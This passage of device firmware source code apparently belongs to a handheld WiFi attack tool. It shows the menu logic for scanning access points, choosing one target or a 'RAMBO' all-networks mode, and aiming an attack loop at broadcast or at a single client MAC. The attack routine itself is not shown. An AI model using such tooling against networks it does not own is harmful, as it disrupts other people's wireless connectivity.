            drawStringCustom(30, 130, "No WiFi networks detected.", UI_MAIN, 1);
            drawStringCustom(30, 175, "OK: rescan  |  UP/DN: exit",
                             UI_ACCENT, 1);

            while (true) {
                if (navEnterPressed()) {
                    beep(2000, 40);
                    while (navEnterPressed()) delay(5);
                    break;
                }
                if (navUpPressed() || navDownPressed()) {
                    beep(1000, 60);
                    while (navUpPressed() ||
                           navDownPressed()) delay(5);
                    return;
                }
                delay(20);
            }
            continue;
        }

        // 3. Seleccionar AP o RAMBO
        int apChoice = selectAP();

        if (apChoice == -3) break;          // BACK
        if (apChoice == -2) {               // RESCAN
            apCount = 0;
            continue;
        }

        if (apChoice == -1) {               // RAMBO
            if (!confirmRambo()) continue;
            ramboMode = true;
            broadcastMode = true;
            runAttackLoop();
            ramboMode = false;
            continue;
        }

        // AP específico seleccionado
        activeAP = aps[apChoice];
        ramboMode = false;

        // 4. Select action: broadcast vs scan clients
        int action = selectAction(activeAP);
        if (action == -1) continue;         // BACK al selector de AP

        if (action == 0) {
            // BROADCAST directo
            broadcastMode = true;
            runAttackLoop();
            continue;
        }

        // action == 1 → SCAN CLIENTS
        scanClients(activeAP);

        if (clientCount == 0) {
            tft.fillScreen(TFT_BLACK);
            tft.drawRect(0, 0, 320, 240, UI_MAIN);
            drawStringBig(30, 90, "NO CLIENTS FOUND", TFT_RED, 1);
            drawStringCustom(30, 130, "No active clients detected.",
                             UI_MAIN, 1);
            drawStringCustom(30, 145, "You can still broadcast.",
                             UI_ACCENT, 1);
            drawStringCustom(30, 175, "OK: continue", UI_ACCENT, 1);

            while (!navEnterPressed()) delay(20);
            while (navEnterPressed()) delay(5);
            continue;
        }

        // 5. Select target (cliente o ALL)
        while (true) {
            int target = selectTarget();

            if (target == -3) break;                // BACK → action menu
            if (target == -2) {                     // RESCAN clients
                scanClients(activeAP);
                if (clientCount == 0) break;
                continue;
            }

            if (target == -1) {
                // ALL clients
                broadcastMode = true;
            } else {
                // Target específico
                broadcastMode = false;
                memcpy(activeTargetMac, clients[target].mac, 6);
            }

            runAttackLoop();
        }
    }
}
